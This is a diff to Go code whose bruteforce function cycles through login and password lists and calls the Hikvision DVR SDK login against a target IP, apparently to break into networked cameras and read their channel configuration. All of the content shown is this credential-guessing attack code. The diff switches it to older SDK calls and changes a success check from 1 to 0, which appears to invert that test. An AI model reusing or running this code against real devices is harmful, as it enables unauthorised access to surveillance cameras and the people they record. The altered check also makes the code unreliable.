@@ -143,14 +143,14 @@ func bruteforce(ip string, results chan DeviceInfo) {
 
   for _, login := range logins {
     for _, password := range passwords {
-      var device C.NET_DVR_DEVICEINFO_V30
+      var device C.NET_DVR_DEVICEINFO
 
-      uid := (int64)(C.NET_DVR_Login_V30(
+      uid := (int64)(C.NET_DVR_Login(
         C.CString(ip),
         C.WORD(port),
         C.CString(login),
         C.CString(password),
-        (*C.NET_DVR_DEVICEINFO_V30)(unsafe.Pointer(&device)),
+        (*C.NET_DVR_DEVICEINFO)(unsafe.Pointer(&device)),
       ))
 
       if (uid >= 0) {
@@ -167,7 +167,7 @@ func bruteforce(ip string, results chan DeviceInfo) {
             (C.LPVOID)(unsafe.Pointer(&ipcfg)),
             (C.DWORD)(unsafe.Sizeof(ipcfg)),
             (*C.uint32_t)(unsafe.Pointer(&written)),
-          ) == 1) {
+          ) == 0) {
             var count C.BYTE = 0
             for i := 0; i < C.MAX_IP_CHANNEL && ipcfg.struIPChanInfo[i].byEnable == 1; i++ {
               count++
@@ -197,7 +197,7 @@ func bruteforce(ip string, results chan DeviceInfo) {
           CameraAddress{ip, port},
         }
 
-        C.NET_DVR_Logout_V30((C.LONG)(uid))
+        C.NET_DVR_Logout((C.LONG)(uid))
 
         return
       }
